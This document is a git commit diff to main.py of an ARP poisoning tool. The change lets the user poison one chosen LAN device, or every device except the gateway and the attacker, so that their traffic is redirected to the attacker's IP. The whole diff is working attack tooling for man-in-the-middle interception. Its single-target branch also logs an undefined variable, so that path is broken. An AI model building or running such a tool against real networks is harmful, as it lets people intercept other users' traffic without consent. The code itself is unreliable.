00c84e8b4fab6bae21a376edbd3e4191abcc390e
codemaxx1 <garrnic3@isu.edu>
2024-10-26 19:13:24 -0600

    update to arp poisoner

--- main.py
+++ main.py
@@ -28,21 +28,29 @@ def main():
 
     logger.say(f'active devices: {deviceList}')
 
-    while True:
-        target = input("which of the available IP addresses would you like to poison? (I won't let you poison the gateway)")
-
-        if target in deviceList:
-            break
-        logger.error(f"Um... {target} isn't in the list of available IP targets")
 
     # identify the gateway
     gws = netifaces.gateways()
     gateway = gws['default'][netifaces.AF_INET][0]
 
-    for device in deviceList:
-        if device != IP and device != gateway:
+    while True:
+        target = input("which of the available IP addresses would you like to poison? (I won't let you poison the gateway or yourself)\nAlternatively, type \"all\" to poison everyone")
+
+        if target in deviceList and target != IP and target != gateway and str(target) != 'all':
             logger.say(f'poisoning {device} to connect to {IP}')
-            arp.ARP_poison(device, IP, True)
+            arp.ARP_poison(target, IP, True)
+            break
+
+        elif str(target) == 'all':
+            for device in deviceList:
+                if device != IP and device != gateway:
+                    logger.say(f'poisoning {device} to connect to {IP}')
+                    arp.ARP_poison(device, IP, True)
+            break
+
+        logger.error(f"Um... {target} isn't in the list of available IP targets")
+
+
 
     return 1
 
